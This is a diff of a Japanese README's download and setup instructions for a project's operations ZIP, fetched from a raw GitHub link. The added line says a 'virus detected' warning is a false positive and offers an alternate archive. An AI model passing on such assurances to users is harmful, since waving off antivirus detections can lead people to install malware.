@@ -2,7 +2,7 @@
 
 ## ZIPの入手
 https://raw.githubusercontent.com/810eigo-droid/ku-fudo/main/xserver-chat/updates/ku-fudo-operations-20260912.zip
-上のリンクを開くと ku-fudo-operations-20260912.zip がダウンロードされます。GitHubの画面でZIPが落とせない場合はこちらを使ってください。他のZIPは [DOWNLOAD.md](../DOWNLOAD.md) にまとめています。
+上のリンクを開くと ku-fudo-operations-20260912.zip がダウンロードされます。GitHubの画面でZIPが落とせない場合はこちらを使ってください。「ウイルスを検出しました」と出る場合は誤検知です。別形式の ku-fudo-operations-20260912b.zip か、5ファイルの個別リンクを [DOWNLOAD.md](../DOWNLOAD.md) に用意しています。
 
 ## 設置
 1. このZIPをPCで展開します。
